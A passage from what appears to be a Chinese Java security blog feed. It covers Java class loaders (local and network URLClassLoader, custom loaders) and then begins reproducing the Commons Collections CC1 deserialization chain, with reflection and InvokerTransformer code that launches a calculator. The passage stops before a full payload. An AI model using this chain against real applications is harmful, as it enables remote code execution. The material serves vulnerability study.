class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，父类加载器默认认为系统类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，并指定父类加载器。</p><h5 id="使用URLClassLoader加载本地类"><a href="#使用URLClassLoader加载本地类" class="headerlink" title="使用URLClassLoader加载本地类"></a>使用URLClassLoader加载本地类</h5><p>创建一个<code>Demo</code>类如下，路径为<code>/Users/caoyifan/</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> elssm.test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"demo instance"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译该类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . Demo.java</span><br></pre></td></tr></table></figure><p>接着使用自己写的类去加载<code>Demo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        System.out.println(<span class="string">"父类加载器："</span>+classLoader.getParent());</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">父类加载器：sun.misc.Launcher$AppClassLoader@<span class="number">7f</span>31245a</span><br><span class="line">demo instance</span><br></pre></td></tr></table></figure><h5 id="使用URLClassLoader加载网络上的类"><a href="#使用URLClassLoader加载网络上的类" class="headerlink" title="使用URLClassLoader加载网络上的类"></a>使用URLClassLoader加载网络上的类</h5><p>Mac上Apache服务器默认的web根目录在：<code>/Library/WebServer/Documents</code>，我们可以将<code>Demo</code>；类放在该目录下进行加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://localhost:80/"</span>);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><h5 id="自定义文件类加载器"><a href="#自定义文件类加载器" class="headerlink" title="自定义文件类加载器"></a>自定义文件类加载器</h5><ul><li>继承<code>ClassLoader</code>类</li><li>覆盖<code>findClass</code>方法</li></ul><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFileClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String directory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory,ClassLoader parent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//把类名转换为目录</span></span><br><span class="line">            String file = directory + File.separator+name.replace(<span class="string">"."</span>,File.separator)+<span class="string">".class"</span>;</span><br><span class="line">            <span class="comment">//构建输入流</span></span><br><span class="line">            InputStream in = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="comment">//构建字节输出流</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = in.read(buf))!= -<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span> data[] = baos.toByteArray(); <span class="comment">//读取到的字节码的二进制数据</span></span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="自定义网络类加载器"><a href="#自定义网络类加载器" class="headerlink" title="自定义网络类加载器"></a>自定义网络类加载器</h5><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyURLClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyURLClassLoader</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = url+<span class="string">"/"</span>+name.replace(<span class="string">"."</span>,<span class="string">"/"</span>)+<span class="string">".class"</span>;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">            InputStream in = url.openStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len=in.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = baos.toByteArray();</span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyURLClassLoader classLoader = <span class="keyword">new</span> MyURLClassLoader(<span class="string">"http://localhost:80"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="热部署类加载器"><a href="#热部署类加载器" class="headerlink" title="热部署类加载器"></a>热部署类加载器</h5><p>当我们调用<code>loadClass</code>方法加载类时，会采用双亲委派模式，即如果类已经被加载，就从缓存中获取，不会重新加载，如果同一个<code>class</code>被同一个类加载器加载多次，则会报错。因此我们要实现热部署让同一个<code>class</code>文件被不同的类加载器重复加载即可，但是不能调用<code>loadClass</code>方法，而应该调用<code>findClass</code>方法，避开双亲委派模式，从而实现同一个类被多次加载，实现热部署。</p><p>具体测试</p><p>使用<code>loadClass</code>加载，输出的<code>hashCode</code>是相同的，说明没有被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>findClass</code>加载，输出的<code>hashCode</code>是不同的，说明被重复加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类的显式与隐式加载"><a href="#类的显式与隐式加载" class="headerlink" title="类的显式与隐式加载"></a>类的显式与隐式加载</h4><p>类的加载方式是指虚拟机将<code>class</code>文件加载到内存的方式。</p><p>显式加载是指在Java代码中通过调用<code>ClassLoader</code>加载<code>class</code>对象，比如<code>Class.forName(String name)</code>或者<code>this.getClass().getClassLoader().loadClass()</code>加载类</p><p>隐式加载不需要在Java代码中明确调用加载的代码，而是通过虚拟机自动加载到内存中，比如在加载某个<code>class</code>时，该<code>class</code>引用了另外一个类的对象，那么这个对象的字节码文件就会被虚拟机自动加载到内存中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;类的加载概述&quot;&gt;&lt;a href=&quot;#类的加载概述&quot; class=&quot;headerlink&quot; title=&quot;类的加载概述&quot;&gt;&lt;/a&gt;类的加载概述&lt;/h4&gt;&lt;p&gt;我们编写的&lt;code&gt;.java&lt;/code&gt;扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过&lt;c
      
    
    </summary>
    
    
      <category term="java" scheme="elssm.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC1链复现与分析</title>
    <link href="elssm.github.io/2021/10/27/Java-CC1%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/10/27/Java-CC1链复现与分析/</id>
    <published>2021-10-27T14:20:34.000Z</published>
    <updated>2021-10-30T08:44:26.535Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h4><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。其实Java JDK已经提供了丰富的集合操作，但是在某些场合下，可能无法满足，apache commons组件提供了更加丰富的集数据结构。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections3.1</span><br></pre></td></tr></table></figure><p>JDK7下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><p><img src="/2021/10/27/Java-CC1链复现与分析/23.png" alt="23"></p><p>下载好之后查看本地JDK版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ls /Library/Java/JavaVirtualMachines </span><br><span class="line">jdk1.7.0_06.jdkjdk1.8.0_191.jdk</span><br></pre></td></tr></table></figure><h5 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h5><p>创建好Maven项目之后，指定对应的JDK版本即可</p><p><img src="/2021/10/27/Java-CC1链复现与分析/1.png" alt="1"></p><p>Common Collections3.1通过maven添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="一个简单反射例子"><a href="#一个简单反射例子" class="headerlink" title="一个简单反射例子"></a>一个简单反射例子</h5><p>在分析该漏洞之前我们先写一个利用反射弹计算器的例子。后面的漏洞分析会基于这个例子进行修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Method m = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="从Trnsformer看起"><a href="#从Trnsformer看起" class="headerlink" title="从Trnsformer看起"></a>从Trnsformer看起</h5><p>我们知道该漏洞的问题出现在Transformer接口类，因此我们首先查看一下实现这个类都有哪些方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/2.png" alt="2"></p><p>这个时候我们随便点进去一个方法看看具体是怎么实现的。例如在<code>ConstantTransformer</code>类返回的是一个常量。在<code>InvokerTransformer</code>类中实现的是一个反射调用，而且参数都是可控的。因此我们尝试利用<code>InvokerTransformer</code>来改写上面的反射的例子。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/3.png" alt="3"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>在<code>InvokerTransformer</code>类中存在三个参数是我们可控的，因此我们只需要按照transform方法中的调用方式传值就可以了。改写后的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们已经找到了一个点，是<code>InvokerTransformer.transform</code>这个方法，它是一个危险方法，接着我们向上继续找还有哪些调用了<code>transform</code>方法，最好是不同名的</p><p><img src="/2021/10/27/Java-CC1链复现与分析/4.png" alt="4"></p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>注意到<code>TransformedMap</code>这个类，因为在这个类中有好几处都调用了<code>transform</code>这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/5.png" alt="5"></p><p>跟进<code>checkSetValue</code>方法， 发现调用了<code>valueTransformer</code>的<code>transform</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/6.png" alt="6"></p><p>找到<code>TransformedMap</code>的构造函数，发现传入了一个<code>map</code>和两个<code>Transformer</code>，可以理解为接受一个<code>map</code>并对这个<code>map</code>的<code>key</code>和<code>value</code>做一些操作，因为这是一个保护方法， 我们继续找一下在哪里调用了这个方法。</p><p><img src="/2021/10/27/Java-CC1链复现与分析/7.png" alt="7"></p><p>在构造方法上面找到了<code>decorate</code>静态方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/8.png" alt="8"></p><p>接着我们向上查找哪些调用了<code>checkSetValue</code>方法，发现只有一处调用了该方法，继续跟进</p><p><img src="/2021/10/27/Java-CC1链复现与分析/9.png" alt="9"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>类中有一个<code>MapEntry</code>类，这个类调用了<code>setValue</code>方法</p><p><img src="/2021/10/27/Java-CC1链复现与分析/10.png" alt="10"></p><h5 id="MapEntry"><a href="#MapEntry" class="headerlink" title="MapEntry"></a>MapEntry</h5><p>这个时候我们梳理一遍，当我们遍历被修饰的<code>Map</code>的时候，就会走到<code>setValue</code>这个方法，从而会调用<code>checkSetValue</code>，接着调用到了<code>valueTransformer.transform</code>方法，之后就会走到<code>InvokerTransformer.transform</code>方法执行</p><p>我们再次尝试改写上面的例子，首先实例化一个<code>map</code>对象，并对<code>map</code>进行装饰，因为在后面执行<code>transform</code>方法的是<code>decorate</code>方法传入的第三个参数，因此我们可以给第二个参数传一个空值，之后通过<code>for</code>循环调用<code>setValue</code>方法将我们的<code>Runtime.getRuntime()</code>对象传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span 